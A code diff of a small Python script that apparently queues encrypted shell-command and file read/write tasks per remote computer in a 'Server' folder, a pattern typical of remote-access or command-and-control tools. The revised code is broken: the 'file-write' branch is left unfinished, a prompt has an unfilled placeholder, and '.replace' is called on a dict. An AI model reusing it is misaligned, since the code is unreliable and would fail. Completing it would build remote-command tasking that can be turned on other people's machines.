@@ -3,21 +3,28 @@ from Encryptor import *
 def writecommands():
     computer = input('>')
     commands = get_commands(computer)
-    commands = commands.replace('\'', '"')
     with open(f'Server/{computer.lower()}.txt', 'w', encoding='utf-8') as file:
         file.write(encrypt(commands))
 
 def get_commands(computer):
     commands = {}
     while True:
-        key = input(f'{computer}>')
-        if key == '^C': break
+        command = input('%s>' % computer)
         values = []
-        while True:
-            value = input(f'{computer}:{key}>')
-            if value == '^C': break
-            values.append(value)
-            commands[key] = values
+        if command == chr(0):
+            break
+        if command == 'cmd' or command == 'file-read':
+            while True:
+                value = input('%s:%s>' % (computer, command))
+                if value == chr(0):
+                    break
+                values.append(value)
+        elif command == 'file-write':
+            while True:
+                filename = input('%s:name>')
+                    
+                
+    commands = commands.replace('\'', '"')
     return str(commands)
 
 writecommands()
